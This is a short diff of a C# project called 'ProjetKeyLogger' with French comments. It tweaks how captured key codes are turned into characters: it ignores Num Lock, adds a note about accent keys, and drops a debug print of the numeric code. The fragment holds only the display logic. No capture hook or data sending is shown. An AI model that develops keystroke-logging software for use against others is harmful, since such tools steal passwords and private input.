@@ -162,6 +162,10 @@ namespace ProjetKeyLogger
                                 Console.Write(valeurs.Substring(codeASCII - 106, 1));
                                 break;
 
+                            //verrouillage du pavé numerique
+                            case 144:
+                                break;
+
                             //l'autre shift
                             case 160:
                             case 161:
@@ -185,6 +189,7 @@ namespace ProjetKeyLogger
                                 break;
 
                             //faire une correction pour que ca fasse directement la lettre ê par exemple avec la touche ^ ?
+                            //ou blk car si on reproduit ces touches ca donnera le même resultat 
                             case 219:
                             case 220:
                             case 221:
@@ -217,7 +222,7 @@ namespace ProjetKeyLogger
                             default:
                                 if (majuscule == false)
                                 {
-                                    Console.Write(Char.ToLower((char)codeASCII)+""+codeASCII);
+                                    Console.Write(Char.ToLower((char)codeASCII));
                                 }
                                 else
                                 {
